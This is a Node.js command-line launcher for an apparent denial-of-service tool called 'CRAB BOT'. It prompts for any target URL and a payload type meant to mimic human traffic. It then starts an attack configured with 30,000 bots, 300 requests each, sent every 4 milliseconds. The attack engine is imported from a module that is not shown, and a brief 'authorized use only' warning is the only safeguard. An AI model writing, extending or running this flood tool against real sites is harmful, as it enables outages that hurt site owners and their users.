#!/usr/bin/env node

const inquirer = require('inquirer');
const chalk = require('chalk');
const { startAttack } = require('./engine');

async function run() {
    console.log(chalk.red.bold(`
    ██████╗██████╗  █████╗ ██████╗     ██████╗  ██████╗ ████████╗
    ██╔════╝██╔══██╗██╔══██╗██╔══██╗    ██╔══██╗██╔═══██╗╚══██╔══╝
    ██║     ██████╔╝███████║██████╔╝    ██████╔╝██║   ██║   ██║   
    ██║     ██╔══██╗██╔══██║██╔══██╗    ██╔══██╗██║   ██║   ██║   
    ╚██████╗██║  ██║██║  ██║██████╔╝    ██████╔╝╚██████╔╝   ██║   
     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     ╚═════╝  ╚═════╝    ╚═╝   
                                v2.0 - SUPER ENGINE
    `));

    console.log(chalk.yellow.bold('WARNING: THIS IS A HIGH-POWERED CYBER SECURITY TOOL. AUTHORIZED USE ONLY.\n'));

    const answers = await inquirer.prompt([
        {
            type: 'input',
            name: 'url',
            message: 'Enter the Target URL (e.g., https://your-site.com):',
            validate: (input) => {
                if (input.startsWith('http://') || input.startsWith('https://')) return true;
                return 'Please enter a valid URL starting with http:// or https://';
            }
        },
        {
            type: 'list',
            name: 'payloadType',
            message: 'Select Payload Type (to simulate human behavior):',
            choices: ['random', 'json', 'xml']
        },
        {
            type: 'confirm',
            name: 'confirm',
            message: chalk.red('Are you sure you want to deploy 30,000 Super Bots?'),
            default: false
        }
    ]);

    if (answers.confirm) {
        await startAttack(answers.url, {
            botCount: 30000,
            requestsPerBot: 300,
            intervalMs: 4,
            payloadType: answers.payloadType
        });
    } else {
        console.log(chalk.yellow('\n[!] Deployment aborted.'));
    }
}

run().catch(err => {
    console.error(chalk.red('\n[!] Fatal Error:'), err.message);
});
